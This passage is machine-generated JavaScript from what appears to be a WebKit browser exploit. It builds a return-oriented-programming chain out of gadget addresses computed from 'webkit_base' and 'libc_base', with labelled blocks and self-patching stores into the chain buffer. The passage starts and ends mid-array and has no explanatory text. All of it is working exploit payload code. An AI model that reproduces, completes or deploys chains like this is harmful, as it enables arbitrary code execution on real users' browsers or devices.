]);
//L607:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+89552, //L608-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L608:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+89608, //L611-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L611:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+89712, //L614-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L612:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L614:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+89816, //L617-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+89800, //L616-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L616:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L617:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+89960, //L620-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+89928, //L618-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+89944, //L619-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+90032, //L621-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L621:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+90088, //L624-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L624:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+90168, //L625-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L625:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L626:
db([8, 0]); // 0x8
set_gadget(libc_base+757614,); //pop rcx
//L627:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+90272, //L628-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+90288, //L629-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+90376, //L630-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L630:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+90432, //L633-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L633:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+90552, //L636-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L634:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L636:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+90656, //L639-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+90640, //L638-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L638:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L639:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+90800, //L642-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+90768, //L640-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+90784, //L641-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+90872, //L643-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L643:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+90928, //L646-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L646:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+91008, //L647-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L647:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L648:
db([7, 0]); // 0x7
set_gadget(libc_base+757614,); //pop rcx
//L649:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+91112, //L650-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+91128, //L651-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+91216, //L652-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L652:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+91272, //L655-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L655:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+91344, //L656-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+91400, //L659-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L659:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+91504, //L662-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L660:
db([40, 0]); // 0x28
set_gadget(libc_base+757614,); //pop rcx
//L662:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+91608, //L665-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+91592, //L664-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L664:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L665:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+91752, //L668-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+91720, //L666-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+91736, //L667-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+91848, //L671-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L669:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L671:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+91952, //L674-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+91936, //L673-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L673:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+92096, //L677-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+92064, //L675-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+92080, //L676-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+92168, //L678-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+92224, //L681-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L681:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+92304, //L682-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L682:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L683:
db([8, 0]); // 0x8
set_gadget(libc_base+757614,); //pop rcx
//L684:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+92408, //L685-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+92424, //L686-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+92512, //L687-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+92568, //L690-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L690:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+92640, //L691-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L691:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+92696, //L694-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L694:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L695:
libc_base+467092, //pop rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+92848, //L698-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L696:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L698:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+92952, //L701-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+92936, //L700-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L700:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L701:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+93096, //L704-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+93064, //L702-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+93080, //L703-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+93168, //L705-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L705:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+93224, //L708-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L708:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+93304, //L709-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L709:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L710:
db([9, 0]); // 0x9
set_gadget(libc_base+757614,); //pop rcx
//L711:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+93408, //L712-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+93424, //L713-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+93512, //L714-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+93568, //L717-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L717:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+93640, //L718-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L718:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+93696, //L721-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L721:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+93800, //L724-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L722:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+93904, //L727-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+93888, //L726-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L726:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L727:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+94048, //L730-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+94016, //L728-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+94032, //L729-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L728:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+94120, //L731-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L731:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+94176, //L734-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L734:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+94256, //L735-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L735:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L736:
db([9, 0]); // 0x9
set_gadget(libc_base+757614,); //pop rcx
//L737:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+94360, //L738-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+94376, //L739-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L738:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+94464, //L740-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L740:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+94520, //L743-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L743:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+94640, //L746-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L744:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L746:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+94744, //L749-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+94728, //L748-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L748:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L749:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+94888, //L752-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+94856, //L750-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+94872, //L751-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L750:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L751:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+94960, //L753-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L753:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+95016, //L756-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L756:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+95096, //L757-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L757:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L758:
db([10, 0]); // 0xa
set_gadget(libc_base+757614,); //pop rcx
//L759:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+95200, //L760-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+95216, //L761-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+95304, //L762-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L762:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+95360, //L765-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L765:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+95432, //L766-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+95488, //L769-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
